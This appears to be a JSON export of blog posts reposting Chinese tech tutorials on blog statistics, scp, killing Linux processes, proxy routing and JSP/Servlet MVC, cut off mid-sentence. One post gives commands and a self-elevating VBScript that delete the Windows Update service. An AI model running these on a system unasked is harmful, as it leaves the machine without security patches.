scaffolds目录下，是新建页面的模板，执行新建命令时，是根据这里的模板页来完成的，所以可以在这里根据你自己的需求添加一些默认值。 不蒜子统计功能NexT主题集成了不蒜子统计功能,以下为我的配置 1234567891011121314151617copy# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; site_uv_footer: 人次 # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt; site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt; page_pv_footer: 次 当enable: true时，代表开启全局开关。若site_uv、site_pv、page_pv的值均为false时，不蒜子仅作记录而不会在页面上显示。当site_uv: true时，代表在页面底部显示站点的UV值。当site_pv: true时，代表在页面底部显示站点的PV值。当page_pv: true时，代表在文章页面的标题下显示该页面的PV值（阅读数）。site_uv_header和site_uv_footer这几个为自定义样式配置，相关的值留空时将不显示，可以使用（带特效的）font-awesome。","link":"/2019/10/13/Others/hexo%E5%BB%BA%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"linux-ssh命令远程文件传输","text":"一、scp是什么？ scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。 二、scp有什么用？1、我们需要获得远程服务器上的某个文件，远程服务器既没有配置ftp服务器，没有开启web服务器，也没有做共享，无法通过常规途径获得文件时，只需要通过scp命令便可轻松的达到目的。 2、我们需要将本机上的文件上传到远程服务器上，远程服务器没有开启ftp服务器或共享，无法通过常规途径上传是，只需要通过scp命令便可以轻松的达到目的。 三、scp使用方法1、获取远程服务器上的文件 scp -P 2222 root@www.vpser.net:/root/lnmp0.4.tar.gz /home/lnmp0.4.tar.gz 上端口大写P 为参数，2222 表示更改SSH端口后的端口，如果没有更改SSH端口可以不用添加该参数。 root@www.vpser.net 表示使用root用户登录远程服务器www.vpser.net，:/root/lnmp0.4.tar.gz 表示远程服务器上的文件，最后面的/home/lnmp0.4.tar.gz表示保存在本地上的路径和文件名。还可能会用到p参数保持目录文件的权限访问时间等。 2、获取远程服务器上的目录 scp -P 2222 -r root@www.vpser.net:/root/lnmp0.4/ /home/lnmp0.4/ 上端口大写P 为参数，2222 表示更改SSH端口后的端口，如果没有更改SSH端口可以不用添加该参数。-r 参数表示递归复制（即复制该目录下面的文件和目录）；root@www.vpser.net 表示使用root用户登录远程服务器www.vpser.net，:/root/lnmp0.4/ 表示远程服务器上的目录，最后面的/home/lnmp0.4/表示保存在本地上的路径。 3、将本地文件上传到服务器上 scp -P 2222 /home/lnmp0.4.tar.gz root@www.vpser.net:/root/lnmp0.4.tar.gz 上端口大写P 为参数，2222 表示更改SSH端口后的端口，如果没有更改SSH端口可以不用添加该参数。 /home/lnmp0.4.tar.gz表示本地上准备上传文件的路径和文件名。root@www.vpser.net 表示使用root用户登录远程服务器www.vpser.net，:/root/lnmp0.4.tar.gz 表示保存在远程服务器上目录和文件名。 4、将本地目录上传到服务器上 scp -P 2222 -r /home/lnmp0.4/ root@www.vpser.net:/root/lnmp0.4/ 上 端口大写P 为参数，2222 表示更改SSH端口后的端口，如果没有更改SSH端口可以不用添加该参数。-r 参数表示递归复制（即复制该目录下面的文件和目录）；/home/lnmp0.4/表示准备要上传的目录，root@www.vpser.net 表示使用root用户登录远程服务器www.vpser.net，:/root/lnmp0.4/ 表示保存在远程服务器上的目录位置。 5、可能有用的几个参数 :-v 和大多数 linux 命令中的 -v 意思一样 , 用来显示进度 . 可以用来查看连接 , 认证 , 或是配置错误 . -C 使能压缩选项 . -4 强行使用 IPV4 地址 . -6 强行使用 IPV6 地址 . 转载自：https://www.vpser.net/manage/scp.html","link":"/2019/11/08/Others/linux-ssh%E5%91%BD%E4%BB%A4%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"},{"title":"linux杀死进程的n种方法","text":"ps+kill$ ps -ef ……smx 1822 1 0 11:38 ? 00:00:49 gnome-terminalsmx 1823 1822 0 11:38 ? 00:00:00 gnome-pty-helpersmx 1824 1822 0 11:38 pts/0 00:00:02 bashsmx 1827 1 4 11:38 ? 00:26:28 /usr/lib/firefox-3.6.18/firefox-binsmx 1857 1822 0 11:38 pts/1 00:00:00 bashsmx 1880 1619 0 11:38 ? 00:00:00 update-notifier……smx 11946 1824 0 21:41 pts/0 00:00:00 ps -ef 或者： $ ps -aux …… smx 1822 0.1 0.8 58484 18152 ? Sl 11:38 0:49 gnome-terminalsmx 1823 0.0 0.0 1988 712 ? S 11:38 0:00 gnome-pty-helpersmx 1824 0.0 0.1 6820 3776 pts/0 Ss 11:38 0:02 bashsmx 1827 4.3 5.8 398196 119568 ? Sl 11:38 26:13 /usr/lib/firefox-3.6.18/firefox-binsmx 1857 0.0 0.1 6688 3644 pts/1 Ss 11:38 0:00 bashsmx 1880 0.0 0.6 41536 12620 ? S 11:38 0:00 update-notifier……smx 11953 0.0 0.0 2716 1064 pts/0 R+ 21:42 0:00 ps -aux 此时如果我想杀了火狐的进程就在终端输入： $ kill -s 9 1827 其中-s 9 制定了传递给进程的信号是９，即强制、尽快终止进程。各个终止信号及其作用见附录。 1827则是上面ps查到的火狐的PID。 简单吧，但有个问题，进程少了则无所谓，进程多了，就会觉得痛苦了，无论是ps -ef 还是ps -aux，每次都要在一大串进程信息里面查找到要杀的进程，看的眼都花了。 Ps-ef | grep firefox把ps的查询结果通过管道给grep查找包含特定字符串的进程。管道符“|”用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。 $ ps -ef | grep firefoxsmx 1827 1 4 11:38 ? 00:27:33 /usr/lib/firefox-3.6.18/firefox-binsmx 12029 1824 0 21:54 pts/0 00:00:00 grep –color=auto firefox 这次就清爽了。然后就是 $kill -s 9 1827 还是嫌打字多？ Prep firefox一看到pgrep首先会想到什么？没错，grep！pgrep的p表明了这个命令是专门用于进程查询的grep。 $ pgrep firefox1827 看到了什么？没错火狐的PID，接下来又要打字了： $kill -s 9 1827 pidof firefox-bin看到pidof想到啥？没错pid of xx，字面翻译过来就是 xx的PID。 $ pidof firefox-bin1827和pgrep相比稍显不足的是，pidof必须给出进程的全名。然后就是老生常谈： $kill -s 9 1827 无论使用ps 然后慢慢查找进程PID 还是用grep查找包含相应字符串的进程，亦或者用pgrep直接查找包含相应字符串的进程ＰＩＤ，然后手动输入给ｋｉｌｌ杀掉，都稍显麻烦。有没有更方便的方法？有！ Ps grep cut xargs连用$ps -ef | grep firefox | grep -v grep | cut -c 9-15 | xargs kill -s 9 说明： “grep firefox”的输出结果是，所有含有关键字“firefox”的进程。 “grep -v grep”是在列出的进程中去除含有关键字“grep”的进程。 “cut -c 9-15”是截取输入行的第9个字符到第15个字符，而这正好是进程号PID。 “xargs kill -s 9”中的xargs命令是用来把前面命令的输出结果（PID）作为“kill -s 9”命令的参数，并执行该命令。“kill -s 9”会强行杀掉指定进程。 难道你不想抱怨点什么？没错太长了 pgrep firefox | xargs kill -s 9知道pgrep和pidof两个命令，干嘛还要打那么长一串！ $ pgrep firefox | xargs kill -s 9 ps grep awk xargs连用$ ps -ef | grep firefox | awk ‘{print $2}’ | xargs kill -9kill: No such process 有一个比较郁闷的地方，进程已经正确找到并且终止了，但是执行完却提示找不到进程。 其中awk ‘{print $2}’ 的作用就是打印（print）出第二列的内容。根据常规篇，可以知道ps输出的第二列正好是PID。就把进程相应的PID通过xargs传递给kill作参数，杀掉对应的进程。 kill grep awk连用 难道每次都要调用xargs把PID传递给kill？答案是否定的： $kill -s 9 ps -aux | grep firefox | awk '{print $2}' kill -s 9 pgrep firefox没错，命令依然有点长，换成pgrep。 $kill -s 9 pgrep firefox pkill -9 firefox看到pkill想到了什么？没错pgrep和kill！pkill＝pgrep+kill。 $pkill -９ firefox 说明：”-9” 即发送的信号是9，pkill与kill在这点的差别是：pkill无须 “ｓ”，终止信号等级直接跟在 “-“ 后面。之前我一直以为是 “-s 9”，结果每次运行都无法终止进程。 killall -9 firefoxkillall和pkill是相似的,不过如果给出的进程名不完整，killall会报错。pkill或者pgrep只要给出进程名的一部分就可以终止进程。 $killall -9 firefox **** 附录：各种信号及其用途 Signal Description Signal number on Linux x86[1] SIGABRT Process aborted 6 SIGALRM Signal raised by alarm 14 SIGBUS Bus error: “access to undefined portion of memory object” 7 SIGCHLD Child process terminated, stopped (or continued*) 17 SIGCONT Continue if stopped 18 SIGFPE Floating point exception: “erroneous arithmetic operation” 8 SIGHUP Hangup 1 SIGILL Illegal instruction 4 SIGINT Interrupt 2 SIGKILL Kill (terminate immediately) 9 SIGPIPE Write to pipe with no one reading 13 SIGQUIT Quit and dump core 3 SIGSEGV Segmentation violation 11 SIGSTOP Stop executing temporarily 19 SIGTERM Termination (request to terminate) 15 SIGTSTP Terminal stop signal 20 SIGTTIN Background process attempting to read from tty (“in”) 21 SIGTTOU Background process attempting to write to tty (“out”) 22 SIGUSR1 User-defined 1 10 SIGUSR2 User-defined 2 12 SIGPOLL Pollable event 29 SIGPROF Profiling timer expired 27 SIGSYS Bad syscall 31 SIGTRAP Trace/breakpoint trap 5 SIGURG Urgent data available on socket 23 SIGVTALRM Signal raised by timer counting virtual time: “virtual timer expired” 26 SIGXCPU CPU time limit exceeded 24 SIGXFSZ File size limit exceeded 25 转载自：https://blog.csdn.net/andy572633/article/details/7211546","link":"/2019/11/08/Others/linux%E6%9D%80%E6%AD%BB%E8%BF%9B%E7%A8%8B%E7%9A%84n%E7%A7%8D%E6%96%B9%E6%B3%95/"},{"title":"为什么ping不通google","text":"前言为什么在ping不通Google的时候，我们却可以web直接访问Google (已开启SSR FQ) SSR访问Google#因为GFW的限制导致国内无法直接访问谷歌，那么SSR为什么能绕过限制可以直接访问Google呢？首先我们要先了解一下SSR的工作原理 SSR原理#SSR是基于SS(Shadow socks)开发的 加密代理 软件原理其实很简单 就是使用socks5代理 socks代理只是简单的传递数据包，而不必关心是何种协议，所以socks代理比其他应用层代理要快的多。socks5代理是把你的网络数据请求通过一条通道(连接你和代理服务器之间的通道)，由服务器转发到目的地，这个过程中你是没有通过一条专用通道的，只是数据包的发出，然后被代理服务器收到，整个过程并没有额外的处理 通俗的说：现在你有一个代理服务器在香港，比如你现在想要访问google，你的电脑发出请求，流量通过socks5连接发到你在香港的服务器上，然后再由你在香港的服务器去访问google，再把访问结果传回你的电脑，这样就实现了FQ。 讲了这一大堆看似好像都跟 ping 谷歌没啥关系，不要着急，下面咱就切入正题~ 上面谈到了SSR的核心就是 socks代理，那socks又是啥呢？ socks代理#SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。（定义）socks协议设计之初的目的：就是为了让有权限的用户可以穿过过防火墙的限制 (穿透防火墙) 上面这些是socks的一些简单的介绍，理不理解都无所谓，but最最重要的一点就是SOCKS协议是传输层 (第四层)ICMP协议是网络层(第三层) ping ==&gt; ICMP协议 OSI 七层网络协议# 总结#我们之所以能够访问google是使用web通过http协议应用层(第七层)ssr的socks代理是介于传输层(第四层)**和会话层(第五层)**而我们在ping的时候，则是基于网络层(第三层) 众所周知：上一层协议的代理 对下层没有任何作用~ 所以说当我们尝试ping谷歌的时候，当然是ping不通的。 但可以通过http进行访问，这里使用代理ssr后的curl 演示 转载自：https://www.cnblogs.com/unixcs/p/11274435.html","link":"/2020/07/25/Others/%E4%B8%BA%E4%BB%80%E4%B9%88ping%E4%B8%8D%E9%80%9Agoogle/"},{"title":"彻底关闭win10系统更新","text":"如何关闭Windows10的自动更新真的是个大难题. 当你遇到Windows更新包安装失败,却又被强制每天重新安装并且失败(安装失败有的时候得重启好几次),望着一遍又一遍重启的计算机,你是不是有些抓狂? 这里给了你一个解决办法,那就是彻底删除自动更新服务(wuauserv)来阻止自动更新. 首先我们讲如何备份相关注册表,手动删除这个服务,并且在必要的时候如何手动恢复这个服务. 然后我会给出一个激动人心的脚本,自动完成”备份/删除/恢复wuauserv服务”的操作. 第一部分 手动备份,删除及恢复wuauserv服务.1.备份注册表;wuauserv服务的大部分信息都存在”HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv”路径中,所以要备份这个子键,然后在需要的时候会用到. 方法是按Win+R打开运行窗口,或者按Win+Q打开搜索窗口,输入regedit并点击回车(Enter); 找到路径”HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv”,在”wuauserv”上点击鼠标右键,选择”导出”: 选择路径并保存文件(记住文件完整路径,一会儿恢复的时候要用到): 2.删除wuauserv服务;此操作很简单,在”开始”按钮上点击右键,选择”Windows PowerShell (管理员)(A)”; 输入以下内容禁用Windows Update: sc.exe stop wuauserv sc.exe delete wuauserv 此时windows 10 已经不会再执行自动更新了…… 如果想恢复使用自动更新,那就继续看…… 3.恢复wuauserv服务;恢复服务是相对难度比较高的操作, 在”开始”按钮上点击右键,选择”Windows PowerShell (管理员)(A)”; 输入以下内容恢复wuauserv(Windows Update)服务: 1sc.exe create wuauserv binpath=&quot;c:\\windows\\system32\\svchost.exe -k netsvcs -p&quot; type=share start=auto error=normal tag=no depend=rpcss displayname=&quot;Windows Update&quot; 这还不够,还需要找到第1步保存的注册表文件,双击导入reg文件. 完了以后回到PowerShell窗口. 输入: sc.exe start wuauserv 等会儿再输入: sc.exe query wuauserv 此时服务已经恢复成功,并且成功启动了. 第二部分 使用脚本自动备份删除及恢复wuauserv服务.1.保存文件;先上脚本(文件名”管理Win10自动更新.vbs”,保存编码”ANSI”): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091' 管理Win10自动更新.vbs.' 20190410 增加了自动提权代码;' 20190405 初始版本,实现了基本功能;' 使用说明 https://blog.csdn.net/milaoshu1020/article/details/89045265Const wuauserv_reg = &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv&quot;Set fso = createobject(&quot;scripting.filesystemobject&quot;)Set shell = createobject(&quot;wscript.shell&quot;)curdir = fso.getparentfoldername(wscript.scriptfullname)userregpath = fso.buildpath(curdir,&quot;user.reg&quot;)defaultregpath = fso.buildpath(curdir,&quot;default.reg&quot;)If wscript.arguments.count = 0 Then Set sh = createobject(&quot;shell.application&quot;) sh.shellexecute wscript.fullname,&quot;&quot;&quot;&quot; &amp; wscript.scriptfullname &amp; &quot;&quot;&quot; -admin&quot;,,&quot;runas&quot;ElseIf wscript.arguments.count = 1 And wscript.arguments(0) = &quot;-admin&quot; Then runElse msgbox &quot;脚本启动参数错误!&quot;End IfSub Run() Do ret = inputbox(&quot;1. 备份wuauserv服务的注册表信息;&quot; &amp; vbcrlf &amp; _ &quot;2. 删除wuauserv服务(将禁止Win10自动更新);&quot; &amp; vbcrlf &amp; _ &quot;3. 恢复wuauserv服务(将恢复Win10自动更新);&quot; &amp; vbcrlf &amp; _ vbcrlf &amp; _ &quot;请输入序号:&quot;,,&quot;1&quot;) Select Case ret Case &quot;1&quot; retnum = shell.run(&quot;regedit.exe /s /e &quot;&quot;&quot; &amp; userregpath &amp; &quot;&quot;&quot; &quot;&quot;&quot; &amp; wuauserv_reg &amp; &quot;&quot;&quot;&quot;,0,True) If retnum = 0 Then msgbox &quot;注册表备份完成!&quot;,vbinformation Else msgbox &quot;注册表备份失败!'regedit.exe'返回代码:&quot; &amp; retnum,vbcritical End If Exit Do Case &quot;2&quot; retnum = shell.run(&quot;sc.exe stop wuauserv&quot;,0,True) retnum = shell.run(&quot;sc.exe delete wuauserv&quot;,0,True) If retnum = 0 Then msgbox &quot;已删除wuauserv服务!已禁止Win10自动更新!&quot;,vbexclamation Else msgbox &quot;删除wuauserv服务失败!'sc.exe'返回代码:&quot; &amp; retnum,vbcritical End If Exit Do Case &quot;3&quot; If fso.fileexists(userregpath) Then retnum = shell.run(&quot;sc.exe create wuauserv binpath= &quot;&quot;c:\\windows\\system32\\svchost.exe -k netsvcs -p&quot;&quot; type= share &quot; &amp; _ &quot;start= auto error= normal tag= no depend= rpcss displayname= &quot;&quot;Windows Update&quot;&quot;&quot;,0,True) If retnum &lt;&gt; 0 Then msgbox &quot;恢复wuauserv服务失败!'sc.exe'返回代码:&quot; &amp; retnum,vbcritical Exit Do End If retnum = shell.run(&quot;regedit.exe /s &quot;&quot;&quot; &amp; userregpath &amp; &quot;&quot;&quot;&quot;,0,True) If retnum &lt;&gt; 0 Then msgbox &quot;恢复wuauserv服务失败!'regedit.exe'返回代码:&quot; &amp; retnum,vbcritical Exit Do End If ElseIf fso.fileexists(defaultregpath) Then retnum = shell.run(&quot;sc.exe create wuauserv binpath= &quot;&quot;c:\\windows\\system32\\svchost.exe -k netsvcs -p&quot;&quot; type= share &quot; &amp; _ &quot;start= auto error= normal tag= no depend= rpcss displayname= &quot;&quot;Windows Update&quot;&quot;&quot;,0,True) If retnum &lt;&gt; 0 Then msgbox &quot;恢复wuauserv服务失败!'sc.exe'返回代码:&quot; &amp; retnum,vbcritical Exit Do End If retnum = shell.run(&quot;regedit.exe /s &quot;&quot;&quot; &amp; defaultregpath &amp; &quot;&quot;&quot;&quot;,0,True) If retnum &lt;&gt; 0 Then msgbox &quot;恢复wuauserv服务失败!'regedit.exe'返回代码:&quot; &amp; retnum,vbcritical Exit Do End If Else msgbox &quot;未找到注册表文件(user.reg|default.reg)!恢复失败!&quot;,vbcritical Exit Do End If retnum = shell.run(&quot;sc.exe start wuauserv&quot;,0,True) If retnum &lt;&gt; 0 Then msgbox &quot;启动wuauserv服务失败!'sc.exe'返回代码:&quot; &amp; retnum,vbcritical Exit Do End If msgbox &quot;成功恢复wuauserv服务!成功恢复Win10自动更新!&quot;,vbexclamation Exit Do Case &quot;&quot; Exit Do Case Else msgbox &quot;输入错误!请重新输入!&quot;,vbcritical End SelectLoopEnd Sub 再上注册表文件(文件名”default.reg”): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv]&quot;DependOnService&quot;=hex(7):72,00,70,00,63,00,73,00,73,00,00,00,00,00&quot;Description&quot;=&quot;@%systemroot%\\\\system32\\\\wuaueng.dll,-106&quot;&quot;DisplayName&quot;=&quot;@%systemroot%\\\\system32\\\\wuaueng.dll,-105&quot;&quot;ErrorControl&quot;=dword:00000001&quot;FailureActions&quot;=hex:80,51,01,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\\ 00,01,00,00,00,60,ea,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00&quot;ImagePath&quot;=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,00,\\ 74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,73,\\ 00,76,00,63,00,68,00,6f,00,73,00,74,00,2e,00,65,00,78,00,65,00,20,00,2d,00,\\ 6b,00,20,00,6e,00,65,00,74,00,73,00,76,00,63,00,73,00,20,00,2d,00,70,00,00,\\ 00&quot;ObjectName&quot;=&quot;LocalSystem&quot;&quot;RequiredPrivileges&quot;=hex(7):53,00,65,00,41,00,75,00,64,00,69,00,74,00,50,00,72,\\ 00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,72,00,\\ 65,00,61,00,74,00,65,00,47,00,6c,00,6f,00,62,00,61,00,6c,00,50,00,72,00,69,\\ 00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,72,00,65,00,\\ 61,00,74,00,65,00,50,00,61,00,67,00,65,00,46,00,69,00,6c,00,65,00,50,00,72,\\ 00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,54,00,63,00,\\ 62,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,\\ 00,41,00,73,00,73,00,69,00,67,00,6e,00,50,00,72,00,69,00,6d,00,61,00,72,00,\\ 79,00,54,00,6f,00,6b,00,65,00,6e,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,\\ 00,67,00,65,00,00,00,53,00,65,00,49,00,6d,00,70,00,65,00,72,00,73,00,6f,00,\\ 6e,00,61,00,74,00,65,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,\\ 00,00,00,53,00,65,00,49,00,6e,00,63,00,72,00,65,00,61,00,73,00,65,00,51,00,\\ 75,00,6f,00,74,00,61,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,\\ 00,00,00,53,00,65,00,53,00,68,00,75,00,74,00,64,00,6f,00,77,00,6e,00,50,00,\\ 72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,44,00,65,\\ 00,62,00,75,00,67,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,\\ 00,00,53,00,65,00,42,00,61,00,63,00,6b,00,75,00,70,00,50,00,72,00,69,00,76,\\ 00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,52,00,65,00,73,00,74,00,\\ 6f,00,72,00,65,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,\\ 00,53,00,65,00,53,00,65,00,63,00,75,00,72,00,69,00,74,00,79,00,50,00,72,00,\\ 69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,54,00,61,00,6b,\\ 00,65,00,4f,00,77,00,6e,00,65,00,72,00,73,00,68,00,69,00,70,00,50,00,72,00,\\ 69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,4c,00,6f,00,61,\\ 00,64,00,44,00,72,00,69,00,76,00,65,00,72,00,50,00,72,00,69,00,76,00,69,00,\\ 6c,00,65,00,67,00,65,00,00,00,53,00,65,00,4d,00,61,00,6e,00,61,00,67,00,65,\\ 00,56,00,6f,00,6c,00,75,00,6d,00,65,00,50,00,72,00,69,00,76,00,69,00,6c,00,\\ 65,00,67,00,65,00,00,00,53,00,65,00,53,00,79,00,73,00,74,00,65,00,6d,00,45,\\ 00,6e,00,76,00,69,00,72,00,6f,00,6e,00,6d,00,65,00,6e,00,74,00,50,00,72,00,\\ 69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,72,00,65,\\ 00,61,00,74,00,65,00,53,00,79,00,6d,00,62,00,6f,00,6c,00,69,00,63,00,4c,00,\\ 69,00,6e,00,6b,00,50,00,72,00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,\\ 00,53,00,65,00,49,00,6e,00,63,00,72,00,65,00,61,00,73,00,65,00,42,00,61,00,\\ 73,00,65,00,50,00,72,00,69,00,6f,00,72,00,69,00,74,00,79,00,50,00,72,00,69,\\ 00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,00,00&quot;ServiceSidType&quot;=dword:00000001&quot;Start&quot;=dword:00000002&quot;SvcMemHardLimitInMB&quot;=dword:000000f6&quot;SvcMemMidLimitInMB&quot;=dword:000000a7&quot;SvcMemSoftLimitInMB&quot;=dword:00000058&quot;Type&quot;=dword:00000020[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\\Parameters]&quot;ServiceDll&quot;=hex(2):25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,6f,00,6f,\\ 00,74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,\\ 77,00,75,00,61,00,75,00,65,00,6e,00,67,00,2e,00,64,00,6c,00,6c,00,00,00&quot;ServiceDllUnloadOnStop&quot;=dword:00000001&quot;ServiceMain&quot;=&quot;WUServiceMain&quot;[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\\Security]&quot;Security&quot;=hex:01,00,14,80,78,00,00,00,84,00,00,00,14,00,00,00,30,00,00,00,02,\\ 00,1c,00,01,00,00,00,02,80,14,00,ff,00,0f,00,01,01,00,00,00,00,00,01,00,00,\\ 00,00,02,00,48,00,03,00,00,00,00,00,14,00,9d,00,02,00,01,01,00,00,00,00,00,\\ 05,0b,00,00,00,00,00,18,00,ff,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,\\ 20,02,00,00,00,00,14,00,ff,01,0f,00,01,01,00,00,00,00,00,05,12,00,00,00,01,\\ 01,00,00,00,00,00,05,12,00,00,00,01,01,00,00,00,00,00,05,12,00,00,00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\\TriggerInfo][HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\\TriggerInfo\\0]&quot;Type&quot;=dword:00000005&quot;Action&quot;=dword:00000001&quot;Guid&quot;=hex:e6,ca,9f,65,db,5b,a9,4d,b1,ff,ca,2a,17,8d,46,e0[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv\\TriggerInfo\\1]&quot;Type&quot;=dword:00000005&quot;Action&quot;=dword:00000001&quot;Guid&quot;=hex:c8,46,fb,54,89,f0,4c,46,b1,fd,59,d1,b6,2c,3b,50 将这两个文件放到同一个目录下. 其中vbs文件是开源的脚本文件,功能是备份/删除/恢复wuauserv服务,以禁用/恢复Windows自动升级的功能; reg文件是标准的注册表文件,用于在没有备份的情况下恢复wuauserv服务的注册表结构. 2.启动脚本;双击运行脚本,显示对话框: 按照提示操作即可. FAQ:Q:恢复成功,但是”wuauserv”服务无法启动,怎么办? A:可以打开注册表”HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv”找到”WOW64”数据项,删除即可。————————————————原文链接：https://blog.csdn.net/milaoshu1020/article/details/89045265","link":"/2020/02/15/Others/%E5%BD%BB%E5%BA%95%E5%85%B3%E9%97%ADwin10%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0/"},{"title":"JSP+JAVABEAN+SERVLET(MVC模型)","text":"Servlet开发用户在浏览器中输入一个网址并回车，浏览器会向服务器发送一个HTTP请求。服务器端程序接受这个请求，并对请求进行处理，然后发送一个回应。浏览器收到回应，再把回应的内容显示出来。这种请求—响应模式就是典型的Web应用程序访问过程。 JavaWeb应用程序中所有的请求—响应都是由Servlet完成的。Servlet是JavaWeb的核心程序，所有的网址最终都交给Servlet处理。Servlet并没有main之类的执行方法。当用户访问服务器的时候，Tomcat是通过调用Servlet的某些方法来完成整个处理过程的。 Servlet是什么 一个Servlet程序就是一个实现了特殊接口的Java类，它由支持Servlet的Web服务器调用和启动运行。一个Servlet程序负责处理它所对应的一个或一组URL地址的访问请求，并接收客户端发出的访问请求信息和产生响应内容。 Servlet应用Servlet程序可以完成普通Java程序所能完成的大多数任务：1、获取客户端通过HTML的FORM表单提交的数据和URL后面的参数信息2、创建对客户端的响应信息内容3、访问服务器端的文件系统4、连接数据库并开发基于数据库的应用,5、调用其它的Java类 Servlet工作流程利用Servlet完成的Web应用的实际工作流程是通过Tomcat服务器发布服务，客户端与服务器端之间的交互遵循Http协议完成的。具体工作流程如下： 客户端浏览器向服务器端发送请求。1，服务器端由Tomcat服务器提供的Servlet容器解析接收到的请求。2，通过Web应用程序的配置文件web.xml，解析到对应执行的Servlet。3，Servlet完成客户端发送的请求逻辑，并完成向客户端发送的响应内容。4，由Tomcat服务器提供的Servlet容器向客户端浏览器进行响应。 浏览器提交的请求是遵循HTTP协议的文本。这段文本由服务器也就是Tomcat接收并解析，封装成了HttpServletRequest类型的request对象。所有的HTTP头数据都可以通过request相应的方法查询到。Tomcat同时把输出流封装成为HttpServletResponse类型的response对象，通过设置response对象可以控制输出的内容。在请求—响应的这个过程中，Tomcat把request对象、response对象作为参数，调用Servlet的相应方法，例如doPost(request,response)、doGet(request,response)等。 Servlet接口Servlet是一种实现了javax.servlet.Servlet接口的类。Servlet接口规定了特定的方法来处理特定的请求。Servlet规范是建立在HTTP规范基础上的。HTTP 1.1 规范支持OPTIONS、GET、POST、HEAD、PUT、DELETE、TRACE等7中访问方式，其中最常用的就是GET和POST了。 GET：表示查询信息，URL中可以附带少量的参数信息，但是URL总长度不能超过255个字符，并且参数会显示在浏览器地址栏。POST：表示提交信息，一般用于提交大数据信息或者文件，提交的内容不受长度限制，并且不会显示在浏览器地址栏中。 java Web应用设计模式1）采用JSP+JavaBean的技术JSP独自响应请求并发送处理结果给用户，数据通过JavaBean来处理，是JSP技术发展初期经常采用模式1，适用于一些小型开发项目。 **** 2）采用JSP+JavaBean+Servlet技术（MVC模型）MVC(Model-View-Controller)模型，适用于中型以上开发项目 “模型－视图－控制器”关系图： MVC构架设计图： Servlet中的请求转发机制Web应用中，常由Servlet来充当调度员的角色，把这样的Servlet叫控制器，可以将请求转发给另一个Servlet或JSP页面，由它们对请求作进一步处理，并产生对请求的响应。Servlet中实现请求转发方式： 1）共享一个request：request.getRequestDispacher(“xxx.jsp/xxxservlet”).forword(requet,response); 2）重定向： Request.sendRedict(“xxx.jsp/xxxservlet””); MVC模式开发WEB应用的步骤1）定义bean来表示数据和封装业务逻辑 a)定义数据Bean来表示需要显示给用户的结果 b)定义业务Bean来封装业务逻辑,BeanDao. 2)使用Servlet处理用户请求 a)根据用户请求，将数据的处理结果写入bean，并将其存于请求或会话的上下文中 b)通过请求转发的形式，将请求转发到合适的页面，servlet不需要创建任何输出，输出由JSP页面完成 2)JSP页面输出结果: 从bean中获取数据输出 总结① JSP作界面 